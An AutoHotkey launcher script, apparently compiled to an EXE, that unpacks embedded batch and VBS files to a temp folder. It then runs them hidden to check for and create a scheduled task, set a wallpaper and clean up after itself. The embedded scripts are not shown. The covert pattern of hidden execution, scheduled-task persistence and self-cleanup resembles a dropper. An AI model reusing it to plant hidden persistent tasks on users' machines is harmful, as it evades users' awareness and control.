#NoEnv
#SingleInstance Force

; ==============================
; Create temp working directory
; ==============================
tempDir := A_Temp "\ScriptsBuild"
FileCreateDir, %tempDir%
SetWorkingDir, %tempDir%

; ==============================
; Embed files inside the EXE
; ==============================
FileInstall, check_task.bat, %tempDir%\check_task.bat, 1
FileInstall, cleanup.bat, %tempDir%\cleanup.bat, 1
FileInstall, create_task.bat, %tempDir%\create_task.bat, 1
FileInstall, run_hidden.vbs, %tempDir%\run_hidden.vbs, 1
FileInstall, wallpaper.bat, %tempDir%\wallpaper.bat, 1
FileInstall, wallpaper.png, %tempDir%\wallpaper.png, 1

; ==============================
; Execute scripts
; ==============================

; Run check task
RunWait, %ComSpec% /c "%tempDir%\check_task.bat", , Hide

; Create scheduled task
RunWait, %ComSpec% /c "%tempDir%\create_task.bat", , Hide

; Set wallpaper (uses PNG)
RunWait, %ComSpec% /c "%tempDir%\wallpaper.bat", , Hide

; Cleanup
RunWait, %ComSpec% /c "%tempDir%\cleanup.bat", , Hide

ExitApp
